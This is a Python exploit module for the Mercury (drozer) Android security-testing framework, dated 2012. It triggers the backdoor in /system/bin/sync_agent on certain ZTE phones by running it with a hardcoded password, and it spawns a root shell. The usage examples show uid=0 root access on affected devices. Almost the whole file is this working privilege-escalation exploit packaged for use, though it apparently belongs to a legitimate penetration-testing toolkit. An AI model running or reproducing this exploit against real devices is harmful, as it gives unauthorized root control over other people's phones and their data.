from mwr.droidhg.modules import common, Module

class ZTEBackdoor(Module, common.Shell):
    
    name = "ZTE Backdoor"
    description = """
    Exploit the backdoor at /system/bin/sync_agent, on certain ZTE devices, to gain a root shell.
    
    This exploit *should* work on the ZTE Score M and the ZTE Skate.
    """
    examples = """Get root, on an affected device:
    mercury> run exploit.root.ztebackdoor
    # id
    uid=0(root) gid=0(root)
    # 
    
Attempted root on a different device:

    mercury> run exploit.root.ztebackdoor
    : sync_agent: not found
    $ 
    """
    author = ["Anonymous (http://pastebin.com/wamYsqTV)", "Tyrone (@mwrlabs)"]
    date = "2012-12-17"
    license = "MWR Code License"
    path = ["exploit", "root"]

    def execute(self, arguments):
        self.shellStart("sync_agent ztex1609523")
        